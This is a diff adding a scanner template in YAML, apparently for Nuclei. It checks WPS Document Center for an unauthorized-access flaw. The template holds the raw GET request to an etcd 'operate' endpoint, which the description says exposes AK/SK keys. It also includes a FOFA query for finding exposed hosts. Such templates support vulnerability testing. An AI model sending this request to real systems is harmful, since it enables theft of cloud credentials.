@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"code":'
+            - '"msg":'
+            - '"data":'
+            - '"value":'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /open/v6/api/etcd/operate?key=/config/storage&method=get HTTP/1.1
+          Host: {{Hostname}}
+id: WPS-operate-unauthorized
+info:
+    author: Superhero
+    description: |-
+        fofa: body="content=\"WPS文档中心" || (body="window.PUBLICPATH=" && body="window.WEBPATH=")
+        WPS文档中心和文档中台的/open/v6/api/etcd/operate?key=/config/storage&method=get接口存在未授权访问漏洞，攻击者可通过该漏洞获取AK/SK密钥。
+    name: WPS文档中心和文档中台 operate 未授权访问漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/Hra0BymXRQQeCy3-yMmWrw
+    severity: medium
+    tags:
+        - unauthorized
+        - WebPA
